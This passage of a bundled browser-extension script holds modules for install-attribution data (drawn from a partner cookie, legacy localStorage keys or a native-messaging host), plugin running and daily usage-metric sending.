function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

},{"../common/permission-checker":44,"../utils/param-utils":103,"./distribution-module-builder":50}],52:[function(require,module,exports){
'use strict';

var _factory = require('./factory');

var _factory2 = _interopRequireDefault(_factory);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

window.distributionModuleFactory = _factory2.default;

},{"./factory":51}],53:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _mrdsMetricMixin = require('./mrds-metric-mixin');

var _mrdsMetricMixin2 = _interopRequireDefault(_mrdsMetricMixin);

var _nativeMessagingMixin = require('./native-messaging-mixin');

var _nativeMessagingMixin2 = _interopRequireDefault(_nativeMessagingMixin);

var _notificationsMixin = require('./notifications-mixin');

var _notificationsMixin2 = _interopRequireDefault(_notificationsMixin);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = {
  MrdsMetricsMixin: _mrdsMetricMixin2.default,
  NotificationsMixin: _notificationsMixin2.default,
  NativeMessagingMixin: _nativeMessagingMixin2.default
};

},{"./mrds-metric-mixin":54,"./native-messaging-mixin":55,"./notifications-mixin":56}],54:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _get = function get(object, property, receiver) { if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { return get(parent, property, receiver); } } else if ("value" in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } };

exports.default = function (Clazz, metricSender) {
  return function (_Clazz) {
    _inherits(_class, _Clazz);

    function _class() {
      _classCallCheck(this, _class);

      return _possibleConstructorReturn(this, Object.getPrototypeOf(_class).apply(this, arguments));
    }

    _createClass(_class, [{
      key: 'sendMrdsMetric',
      value: function sendMrdsMetric(additionalParameters) {
        return _get(Object.getPrototypeOf(_class.prototype), 'getExtensionData', this).call(this).then(function (extensionData) {
          var parameters = _extends({}, (0, _paramUtils.createMapper)(mrdsSettings.MAPPINGS)(_paramUtils.filter.apply(undefined, [extensionData].concat(_toConsumableArray(mrdsSettings.EXCLUDED_FIELDS)))), (0, _paramUtils.subset)(_extensionDetails2.default, 'version'), additionalParameters);
          return metricSender.send(parameters);
        });
      }
    }]);

    return _class;
  }(Clazz);
};

var _mrdsSettings = require('../constants/mrds-settings');

var mrdsSettings = _interopRequireWildcard(_mrdsSettings);

var _extensionDetails = require('../common/extension-details');

var _extensionDetails2 = _interopRequireDefault(_extensionDetails);

var _paramUtils = require('../utils/param-utils');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _interopRequireWildcard(obj) { if (obj && obj.__esModule) { return obj; } else { var newObj = {}; if (obj != null) { for (var key in obj) { if (Object.prototype.hasOwnProperty.call(obj, key)) newObj[key] = obj[key]; } } newObj.default = obj; return newObj; } }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

},{"../common/extension-details":41,"../constants/mrds-settings":49,"../utils/param-utils":103}],55:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

exports.default = function (Clazz, nativeMessageSender) {
  return function (_Clazz) {
    _inherits(_class, _Clazz);

    function _class() {
      _classCallCheck(this, _class);

      return _possibleConstructorReturn(this, Object.getPrototypeOf(_class).apply(this, arguments));
    }

    _createClass(_class, [{
      key: "sendNativeMessage",
      value: function sendNativeMessage(message) {
        return nativeMessageSender.sendNativeMessage(message);
      }
    }]);

    return _class;
  }(Clazz);
};

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

},{}],56:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

exports.default = function (Clazz) {
  return function (_Clazz) {
    _inherits(_class, _Clazz);

    function _class() {
      _classCallCheck(this, _class);

      return _possibleConstructorReturn(this, Object.getPrototypeOf(_class).apply(this, arguments));
    }

    _createClass(_class, [{
      key: 'createNotification',
      value: function createNotification(options) {
        var handlers = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];

        return (0, _notificationFactory2.default)(_extends({ options: options }, handlers));
      }
    }]);

    return _class;
  }(Clazz);
};

var _notificationFactory = require('../modules/notifications/factory/notification-factory');

var _notificationFactory2 = _interopRequireDefault(_notificationFactory);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

},{"../modules/notifications/factory/notification-factory":75}],57:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var BaseDataGenerator = function () {
  function BaseDataGenerator() {
    _classCallCheck(this, BaseDataGenerator);
  }

  _createClass(BaseDataGenerator, [{
    key: 'generate',
    value: function generate() {
      return Promise.reject('Method should be overridden');
    }
  }]);

  return BaseDataGenerator;
}();

exports.default = BaseDataGenerator;

},{}],58:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _baseDataGenerator = require('./base-data-generator');

var _baseDataGenerator2 = _interopRequireDefault(_baseDataGenerator);

var _guid = require('../../utils/guid');

var _guid2 = _interopRequireDefault(_guid);

var _paramUtils = require('../../utils/param-utils');

var _queryString = require('../../utils/query-string');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var mappings = {
  online_callback: 'partner_product_online_url'
};

var CookieDataGenerator = function (_BaseDataGenerator) {
  _inherits(CookieDataGenerator, _BaseDataGenerator);

  function CookieDataGenerator(cookieFacade) {
    _classCallCheck(this, CookieDataGenerator);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(CookieDataGenerator).call(this));

    _this.__cookieFacade = cookieFacade;
    return _this;
  }

  _createClass(CookieDataGenerator, [{
    key: 'generate',
    value: function generate() {
      return this.__cookieFacade.getCookie().then(function (cookie) {
        if (cookie === null) {
          throw new Error('Specified cookie does not exist');
        }

        var generatedId = (0, _guid2.default)();
        var parsedCookie = (0, _queryString.parseQueryString)(cookie.value);

        return _extends({}, (0, _paramUtils.createMapper)(mappings)(parsedCookie), {
          product_id: generatedId,
          install_id: generatedId
        });
      });
    }
  }]);

  return CookieDataGenerator;
}(_baseDataGenerator2.default);

exports.default = CookieDataGenerator;

},{"../../utils/guid":101,"../../utils/param-utils":103,"../../utils/query-string":104,"./base-data-generator":57}],59:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _baseDataGenerator = require('./base-data-generator');

var _baseDataGenerator2 = _interopRequireDefault(_baseDataGenerator);

var _guid = require('../../utils/guid');

var _guid2 = _interopRequireDefault(_guid);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var DefaultDataGenerator = function (_BaseDataGenerator) {
  _inherits(DefaultDataGenerator, _BaseDataGenerator);

  function DefaultDataGenerator() {
    _classCallCheck(this, DefaultDataGenerator);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(DefaultDataGenerator).apply(this, arguments));
  }

  _createClass(DefaultDataGenerator, [{
    key: 'generate',
    value: function generate() {
      var generatedId = (0, _guid2.default)();

      return Promise.resolve({
        gp: 800000,
        product_id: generatedId,
        install_id: generatedId
      });
    }
  }]);

  return DefaultDataGenerator;
}(_baseDataGenerator2.default);

exports.default = DefaultDataGenerator;

},{"../../utils/guid":101,"./base-data-generator":57}],60:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _cookieDataGenerator = require('./cookie-data-generator');

var _cookieDataGenerator2 = _interopRequireDefault(_cookieDataGenerator);

var _defaultDataGenerator = require('./default-data-generator');

var _defaultDataGenerator2 = _interopRequireDefault(_defaultDataGenerator);

var _nativeMessagingDataGenerator = require('./native-messaging-data-generator');

var _nativeMessagingDataGenerator2 = _interopRequireDefault(_nativeMessagingDataGenerator);

var _legacyDataGenerator = require('./legacy-data-generator');

var _legacyDataGenerator2 = _interopRequireDefault(_legacyDataGenerator);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = { CookieDataGenerator: _cookieDataGenerator2.default, NativeMessagingDataGenerator: _nativeMessagingDataGenerator2.default, LegacyDataGenerator: _legacyDataGenerator2.default, DefaultDataGenerator: _defaultDataGenerator2.default };

},{"./cookie-data-generator":58,"./default-data-generator":59,"./legacy-data-generator":61,"./native-messaging-data-generator":62}],61:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _paramUtils = require('../../utils/param-utils');

var _baseDataGenerator = require('./base-data-generator');

var _baseDataGenerator2 = _interopRequireDefault(_baseDataGenerator);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var mappings = {
  rfr: 'gp'
};

var parameterList = ['rfr', 'product_id', 'install_id', 'go_metric_url', 'mrds_metric_url', 'partner_product_online_url', 'mrds_parameters', 'go_parameters'];

var LegacyDataGenerator = function (_BaseDataGenerator) {
  _inherits(LegacyDataGenerator, _BaseDataGenerator);

  function LegacyDataGenerator() {
    _classCallCheck(this, LegacyDataGenerator);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(LegacyDataGenerator).apply(this, arguments));
  }

  _createClass(LegacyDataGenerator, [{
    key: 'generate',
    value: function generate() {
      var data = {};
      parameterList.forEach(function (key) {
        var value = localStorage.getItem(key);
        if (value !== null) {
          data[key] = value;
        }
      });
      if (data.hasOwnProperty('product_id') && data.product_id !== '') {
        return Promise.resolve((0, _paramUtils.createMapper)(mappings)(data));
      }
      return Promise.reject(new Error('Legacy Sputnik data not found'));
    }
  }]);

  return LegacyDataGenerator;
}(_baseDataGenerator2.default);

exports.default = LegacyDataGenerator;

},{"../../utils/param-utils":103,"./base-data-generator":57}],62:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _paramUtils = require('../../utils/param-utils');

var _baseDataGenerator = require('./base-data-generator');

var _baseDataGenerator2 = _interopRequireDefault(_baseDataGenerator);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var mappings = {
  rfr: 'gp',
  online_callback: 'partner_product_online_url'
};

var NativeMessagingDataGenerator = function (_BaseDataGenerator) {
  _inherits(NativeMessagingDataGenerator, _BaseDataGenerator);

  function NativeMessagingDataGenerator(extensionId, nativeMessagingModule) {
    _classCallCheck(this, NativeMessagingDataGenerator);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(NativeMessagingDataGenerator).call(this));

    _this.__extensionId = extensionId;
    _this.__nativeMessageSender = nativeMessagingModule;
    return _this;
  }

  _createClass(NativeMessagingDataGenerator, [{
    key: 'generate',
    value: function generate() {
      return this.__nativeMessageSender.sendNativeMessage({ Action: 'GetExtInfo', ExtensionId: this.__extensionId }).then(function (response) {
        if (response.Error !== 0) {
          throw new Error('Native messaging error. Code: ' + response.Error);
        }
        return (0, _paramUtils.createMapper)(mappings)(response.InstallData);
      });
    }
  }]);

  return NativeMessagingDataGenerator;
}(_baseDataGenerator2.default);

exports.default = NativeMessagingDataGenerator;

},{"../../utils/param-utils":103,"./base-data-generator":57}],63:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _each = require('async-es/each');

var _each2 = _interopRequireDefault(_each);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var DistributionCommonModule = function () {
  function DistributionCommonModule(extensionDataGenerator, extensionDataStorage) {
    var additionalExtensionData = arguments.length <= 2 || arguments[2] === undefined ? {} : arguments[2];

    _classCallCheck(this, DistributionCommonModule);

    this.__extensionDataStorage = extensionDataStorage;
    this.__extensionDataGenerator = extensionDataGenerator;
    this.__additionalExtensionData = additionalExtensionData;
    this.__plugins = new Map();
  }

  _createClass(DistributionCommonModule, [{
    key: 'getExtensionData',
    value: function getExtensionData() {
      return this.__extensionDataStorage.getData();
    }
  }, {
    key: 'initialize',
    value: function initialize() {
      var _this = this;

      return this.__generateExtensionData().then(function () {
        return _this.__runPlugins();
      });
    }
  }, {
    key: 'registerPlugin',
    value: function registerPlugin(plugin) {
      plugin.setHost(this);
      this.__plugins.set(plugin.getName(), plugin);
      return this;
    }
  }, {
    key: '__generateExtensionData',
    value: function __generateExtensionData() {
      var _this2 = this;

      return this.__extensionDataStorage.hasData().then(function (hasData) {
        if (hasData) {
          return;
        }
        return _this2.__extensionDataGenerator.generateExtensionData().then(function (extensionData) {
          return _extends({}, extensionData, _this2.__additionalExtensionData);
        }).then(function (extensionData) {
          return _this2.__extensionDataStorage.setData(extensionData);
        });
      });
    }
  }, {
    key: '__runPlugins',
    value: function __runPlugins() {
      var _this3 = this;

      (0, _each2.default)(this.__plugins.keys(), function (key, callback) {
        var plugin = _this3.__plugins.get(key);
        console.info('>>> RUN', plugin.getName());
        plugin.run().then(callback);
      });
    }
  }]);

  return DistributionCommonModule;
}();

exports.default = DistributionCommonModule;

},{"async-es/each":2}],64:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _whilst = require('async-es/whilst');

var _whilst2 = _interopRequireDefault(_whilst);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var ExtensionDataGenerator = function () {
  function ExtensionDataGenerator(additionalExtensionData) {
    _classCallCheck(this, ExtensionDataGenerator);

    this.__generators = [];
    this.__additionalExtensionData = additionalExtensionData;
  }

  _createClass(ExtensionDataGenerator, [{
    key: 'addGenerator',
    value: function addGenerator(generator) {
      this.__generators.push(generator);
      return this;
    }
  }, {
    key: 'generateExtensionData',
    value: function generateExtensionData() {
      var _this = this;

      return new Promise(function (resolve, reject) {
        var queue = _this.__generators.reverse();
        var proceed = true;

        var iteratee = function iteratee(callback) {
          var generator = queue.pop();
          generator.generate().then(function (data) {
            console.info('Received extension data', data);
            proceed = false;
            callback(null, data);
          }).catch(function (err) {
            console.error('Extension data not available. Reason:', err);
            callback(null, null);
          });
        };

        var test = function test() {
          return proceed && queue.length > 0;
        };

        (0, _whilst2.default)(test, iteratee, function (err, data) {
          if (err) {
            return reject(err);
          }
          if (data === null) {
            return reject(new Error('No data was generated'));
          }
          console.info('Extension data generated', data);
          resolve(_extends({}, data, _this.__additionalExtensionData));
        });
      });
    }
  }]);

  return ExtensionDataGenerator;
}();

exports.default = ExtensionDataGenerator;

},{"async-es/whilst":36}],65:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _each = require('async-es/each');

var _each2 = _interopRequireDefault(_each);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var MetricManager = function () {
  function MetricManager() {
    _classCallCheck(this, MetricManager);

    this.__senders = [];
  }

  _createClass(MetricManager, [{
    key: 'addSender',
    value: function addSender(metricSender) {
      this.__senders.push(metricSender);
      return this;
    }
  }, {
    key: 'sendMetrics',
    value: function sendMetrics() {
      var _this = this;

      var additionalParameters = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];

      return new Promise(function (resolve) {
        (0, _each2.default)(_this.__senders, function (metricSender, callback) {
          metricSender.shouldBeSent().then(function (should) {
            if (should) {
              return metricSender.send(additionalParameters).then(function () {
                return callback(null);
              });
            }
            callback(null);
          });
        }, function () {
          return resolve(true);
        });
      });
    }
  }]);

  return MetricManager;
}();

exports.default = MetricManager;

},{"async-es/each":2}],66:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _get = function get(object, property, receiver) { if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { return get(parent, property, receiver); } } else if ("value" in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } };

var _statefulMetricSender = require('./stateful-metric-sender');

var _statefulMetricSender2 = _interopRequireDefault(_statefulMetricSender);

var _dateUtils = require('../../utils/date-utils');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var DailyMetricSender = function (_StatefulMetricSender) {
  _inherits(DailyMetricSender, _StatefulMetricSender);

  function DailyMetricSender(baseUrl, parameters, urlIsTemplate, sendCredentials, stateStorage) {
    var sendStateParameters = arguments.length <= 5 || arguments[5] === undefined ? true : arguments[5];

    _classCallCheck(this, DailyMetricSender);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(DailyMetricSender).call(this, baseUrl, parameters, urlIsTemplate, sendCredentials, stateStorage));

    _this.__sendStateParameters = sendStateParameters;
    return _this;
  }

  _createClass(DailyMetricSender, [{
    key: 'send',
    value: function send(additionalParameters) {
      var _this2 = this;

      return this.__getState().then(function (state) {
        var currentDayNumber = state.lastDayNumber + 1;
        var parameters = _this2.__sendStateParameters ? _extends({}, additionalParameters, { day_num: currentDayNumber }) : _extends({}, additionalParameters);

        return _get(Object.getPrototypeOf(DailyMetricSender.prototype), 'send', _this2).call(_this2, parameters).then(function () {
          return _this2.__setState({
            lastDayNumber: currentDayNumber,
            lastDayDate: (0, _dateUtils.today)()
          });
        });
      });
    }
  }, {
    key: 'shouldBeSent',
    value: function shouldBeSent() {
      return this.__getState().then(function (state) {
        return !state.lastDayDate || (0, _dateUtils.today)() > new Date(state.lastDayDate);
      });
    }
  }, {
    key: '__getDefaultState',
    value: function __getDefaultState() {
      return Promise.resolve({
        lastDayNumber: 0,
        lastDayDate: undefined
      });
    }
  }]);

  return DailyMetricSender;
}(_statefulMetricSender2.default);

exports.default = DailyMetricSender;

},{"../../utils/date-utils":100,"./stateful-metric-sender":71}],67:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

